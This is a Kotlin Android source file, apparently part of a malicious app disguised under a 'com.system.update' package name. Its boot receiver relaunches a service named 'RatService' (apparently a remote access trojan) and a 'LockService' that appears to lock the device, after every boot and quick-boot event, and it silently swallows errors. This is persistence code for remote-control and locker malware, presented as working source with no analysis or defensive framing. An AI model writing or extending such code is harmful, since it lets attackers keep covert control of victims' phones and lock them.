package com.system.update

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action ?: return
        if (action == Intent.ACTION_BOOT_COMPLETED ||
            action == Intent.ACTION_LOCKED_BOOT_COMPLETED ||
            action == "android.intent.action.QUICKBOOT_POWERON" ||
            action == "com.htc.intent.action.QUICKBOOT_POWERON") {

            // Restart RatService
            try {
                val i = Intent(context, RatService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(i)
                } else {
                    context.startService(i)
                }
            } catch (_: Exception) {}

            // Restart LockService kalau sedang locked
            try {
                val prefs = context.getSharedPreferences(LockService.PREFS, Context.MODE_PRIVATE)
                val savedType = prefs.getString("type", null)
                if (!savedType.isNullOrEmpty()) {
                    val i = Intent(context, LockService::class.java)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        context.startForegroundService(i)
                    } else {
                        context.startService(i)
                    }
                }
            } catch (_: Exception) {}
        }
    }
}
